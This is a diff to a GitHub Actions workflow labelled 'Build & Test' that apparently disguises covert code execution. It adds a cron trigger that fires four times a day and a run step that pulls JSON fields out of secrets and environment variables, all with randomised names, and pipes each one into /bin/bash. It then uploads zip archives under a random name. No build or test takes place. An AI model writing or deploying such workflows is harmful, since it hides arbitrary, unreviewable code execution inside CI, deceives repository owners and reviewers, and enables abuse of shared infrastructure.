@@ -2,6 +2,8 @@ name: Build & Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '43 0,6,12,18 * * *'
 env:
   CI: true
 concurrency:
@@ -14,16 +16,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run
         env:
-          vga06043: ${{ secrets.vga06043 }}
+          kvzk7023: ${{ secrets.kvzk7023 }}
         run: |
-          printf '%s' "$vga06043" | jq -r .gyj4 | /bin/bash
-          printf '%s' "$cof66" | jq -r .ok50868 | /bin/bash
-          echo $nkms3 | jq -r .zv97 | /bin/bash
-          echo $kpbw647 | jq -r .el2029 | /bin/bash
+          printf '%s' "$kvzk7023" | jq -r .iiedi86990 | /bin/bash
+          echo $a7427 | jq -r .q4 | /bin/bash
+          echo $g8 | jq -r .k7333 | /bin/bash
+          echo $wukl502 | jq -r .xzi1147 | /bin/bash
+          echo $rpxmv883 | jq -r .ko40298 | /bin/bash
+          echo $lhjo474 | jq -r .stigy8411 | /bin/bash
+          echo $dwu16658 | jq -r .nn77 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
         with:
-          name: vuvOY3yT
+          name: zvdjkE8N
           path: "*.zip"
           retention-days: 1
